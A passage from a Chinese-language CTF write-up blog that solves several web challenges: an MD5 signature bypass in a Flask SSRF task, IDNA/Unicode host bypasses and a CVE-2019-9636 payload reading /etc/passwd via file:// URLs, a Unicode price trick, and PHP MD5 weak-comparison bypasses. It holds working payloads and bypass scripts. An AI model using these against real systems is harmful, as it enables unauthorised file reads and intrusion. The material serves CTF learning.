class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span><span class="comment">#python的构造方法</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span>                       <span class="comment">#定义的命令执行函数，此处调用了scan这个自定义的函数</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:<span class="comment">#action要写scan</span></span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)   <span class="comment">#文件读取</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp            <span class="comment">#输出结果</span></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:<span class="comment">#action要加read</span></span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#!!!校验</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST']) #用于测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>)) </span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])#实际注入</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr   <span class="comment">#获取用户ip</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')#根目录路由</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span><span class="comment">#这是用来扫目录的函数</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span><span class="comment">#MD5计算,此处注意顺序先是param后是action</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span><span class="comment">#无用的waf</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>是一个利用flask框架搭的，有两个路由分别是<code>geneSign</code>和<code>De1ta</code></p><p>首先来读代码<code>geneSign</code>是用来计算传入的<code>param</code>+scan的md5值，应该是用于测试的</p><p><code>De1ta</code>分别可传入一个<code>get</code>参数<code>param</code>，两个<code>cookie</code>参数<code>action</code>和<code>sign</code>，并且<code>param</code>参数套了一层<code>waf</code></p><p>随后建立<code>Task</code>类使用<code>Exec</code>方法，在看看<code>Task</code>类是用来干什么的</p><p>里面可以<code>print</code>出<code>scan</code>方法后<code>param</code>的结果，根据题目提示<code>flag is in ./flag.txt</code>应该是让我们去想办法读取到flag文件然后输出</p><p>再看到<code>Exec</code>方法的第一个if，引用了<code>checkSign</code>方法，进行md5值的比较，这里是肯定要想办法绕过的了，问题是怎么绕？可以看到后面的if语句，如果我们想要读到<code>flag</code>，就需要让<code>action</code>中有<code>read</code>和<code>scan</code></p><p>再看到<code>geneSign</code>路由，里面固定死了<code>action</code>的值为<code>scan</code>，我们可以传入<code>param</code>的值来得到md5值</p><p>于是设想，如果<code>param</code>=<code>flag.txtread</code>，那么计算出来的md5值就是<code>flag.txtreadscan</code>的md5值，注意<code>getSign</code>方法虽然参数顺序不一样但是在函数中参数还是调了回来，我们将得到的md5赋给<code>sign</code>，再令<code>param</code>=<code>flag.txt</code>,<code>action</code>=<code>readscan</code>，那么<code>checkSign</code>不就可以返回<code>True</code>成功了比较吗，于是得到payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">param&#x3D;flag.txt</span><br><span class="line">action&#x3D;readscan;</span><br><span class="line">sign&#x3D;8bdad5e249bb114a8874247817be9bad</span><br></pre></td></tr></table></figure><p>抓包传入即可得到flag</p><h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="SUCTF-2019—Pythonginx"><a href="#SUCTF-2019—Pythonginx" class="headerlink" title="SUCTF-2019—Pythonginx"></a>SUCTF-2019—Pythonginx</h2><p>首先看到题目给出的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><p>我们可以传入url参数，要绕过前连两次<code>if</code>的判断也就是<code>host!=suctf.cc</code>，在最后一次要等于，就可以进行<code>urlopen(finalUrl).read()</code>文件读取的操作，推测是要我们进行文件读取</p><p><strong>Nginx下的重要文件位置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class="line">配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>这里就要想办法如何绕过前面的两个if，而在第三个if的时候又要判断通过，可以看到在最后一个if语句的前面有这样的一个操作：<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，先对里面的字符进行了<code>idna</code>编码，随后有进行了<code>utf-8</code>解码，详情<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">参考</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428121257327.png" alt="image-20200428121257327"></p><p>大概意思就是通过这样的编码就可以对传入的数据进行绕过</p><p>于是用脚本进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url=url</span><br><span class="line">    host=parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts=list(urlsplit(url))</span><br><span class="line">    host=parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost=[]</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>]=<span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl=urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host=parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure><p>得出如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure><p>传入读取文件即可</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428122756772.png" alt="image-20200428122756772"></p><p>另外还有一种用<code>℆</code>字符进行的读法：</p><p><code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>==经过编码==&gt;<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>，将c和u都给补全了，这样也可以读取到文件内容</p><p>另外这里还有个非预期解利用的是<code>CVE-2019-9636</code>，利用的是<code>urlsplit不处理NFKC标准化</code>，payload：<code>file:////suctf.cc/../../../../../etc/passwd</code>，资料较少，利用的似乎是那四个斜杠</p><p><code>list(urllib.parse.urlsplit(&quot;file:////suctf.cc/../../../../../etc/passwd&quot;))</code>=<code>[&#39;file&#39;, &#39;&#39;, &#39;//suctf.cc/../../../../../etc/passwd&#39;, &#39;&#39;, &#39;&#39;]</code>，这样一来第二个值就不是原来的<code>hostname</code>而是空，即可绕过前两个if判断，漏洞利用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python Python &gt;&#x3D;2.7.x，&lt;&#x3D;2.7.16</span><br><span class="line">Python Python &gt;&#x3D;3.x，&lt;&#x3D;3.7.2</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200502184210541.png" alt=""></p><p>可以看到应该是叫我们买独角兽，而且肯定是要买最贵的那个</p><p>首先输入<code>4</code>和<code>1337.0</code>提示<code>Only one char(?) allowed!</code>只能输入一个字符，在试一下发现报错页面代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/tornado/web.py"</span>, line <span class="number">1541</span>, <span class="keyword">in</span> _execute</span><br><span class="line">    result = method(*self.path_args, **self.path_kwargs)</span><br><span class="line">  File <span class="string">"/app/sshop/views/Shop.py"</span>, line <span class="number">34</span>, <span class="keyword">in</span> post</span><br><span class="line">    unicodedata.numeric(price)</span><br><span class="line">TypeError: need a single Unicode character <span class="keyword">as</span> parameter</span><br></pre></td></tr></table></figure><p>需要一个Unicode字符作为参数，再回到前面看看源码，有提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="comment">&lt;!--Ah,really important,seriously. --&gt;</span></span><br></pre></td></tr></table></figure><p>于是我们寻找到比1337大的<code>Unicode</code>字符<code>U+4E07</code>，<code>utf-8</code>编码后的16进制为<code>E4 B8 87</code>，在前面加入<code>%</code>得到<code>%E4%B8%87</code>传入即可</p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="安恒月赛—web2-hash"><a href="#安恒月赛—web2-hash" class="headerlink" title="安恒月赛—web2_hash"></a>安恒月赛—web2_hash</h2><p>本题参考：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html#web2_hash" target="_blank" rel="noopener">2020二月安恒月赛抗疫练习赛web题目writeup</a><br><a href="https://xz.aliyun.com/t/4741#toc-7" target="_blank" rel="noopener">2019掘安杯web7 writeup</a><br><a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">第二届强网杯 MD5碰撞 writeup</a></p></blockquote><p>进来先看界面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$val1 = @$_GET[<span class="string">'val1'</span>];</span><br><span class="line">$val2 = @$_GET[<span class="string">'val2'</span>];</span><br><span class="line">$val3 = @$_GET[<span class="string">'val3'</span>];</span><br><span class="line">$val4 = @$_GET[<span class="string">'val4'</span>];</span><br><span class="line">$val5 = (string)@$_POST[<span class="string">'val5'</span>];</span><br><span class="line">$val6 = (string)@$_POST[<span class="string">'val6'</span>];</span><br><span class="line">$val7 = (string)@$_POST[<span class="string">'val7'</span>];</span><br><span class="line"><span class="keyword">if</span>( $val1 == $val2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val1 OR val2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($val1) != md5($val2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val3 == $val4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val3 OR val4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($val3) !== md5($val4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val5 OR val6 OR val7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_alnum($a)) || (strlen($a) &gt; <span class="number">5</span>)  || !(ctype_alnum($b)) || (strlen($b) &gt; <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">1</span>) || (strlen($n) &gt; <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 = md5($a);</span><br><span class="line">$val9 = strtr(md5($b), $m, $n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val8 : $val8&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val9 : $val9&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计一个一个绕</p><p>第1、2个if：<code>val1</code>不能和<code>val2</code>一样，且<code>val1</code>和<code>val2</code>的MD5值需要相同，由于这里是用<code>!=</code>进行判断的，于是就可以用MD5弱比较进行绕过；这里给出两个可以绕过比较的字符串<code>s878926199a</code>和<code>s155964671a</code>、payload：<code>?val1=s878926199a&amp;val2=s155964671a</code>、随后进入下个if（当然这里也可以用数组绕过，下两个if解释）</p><blockquote><p>注：<code>s878926199a</code>的MD5值为<code>0e545993274517709034328855841020</code>，<code>s155964671a</code>的MD5值为<code>0e342768416822451524974117254469</code>函数在执行<code>!=</code>判断的时候会认为是以<code>0e</code>开头的科学计数法，所以两边都为0，即构成了弱比较绕过</p></blockquote><p>第3、4个if：<code>val3</code>不能和<code>val4</code>一样，且<code>val3</code>和<code>val4</code>的MD5值需要相同，而这里使用的是<code>!==</code>进行判断，这种判断会对MD5加密后的字符串进行严格的逐个字符判断，所以使用上面的方法是无效的，但是这里可以使用数组类型进行绕过，由于MD5函数无法处理数组，所以两边返回的都是<code>NULL</code>（上两个if也适用），就构成了绕过；payload：<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p><p>第5、6个if：这里的函数需要让<code>val5</code>、<code>val6</code>、<code>val7</code>都不相等，且三个值的MD5值需要相同，并且使用的是<code>!==</code>进行判断，且在获取数值的时候进行了<code>string</code>类型转换，如果是数组的话会直接转换不成功，三个值没得到东西，第一个判断都过不了，这里就需要找到三个真正相等的MD5值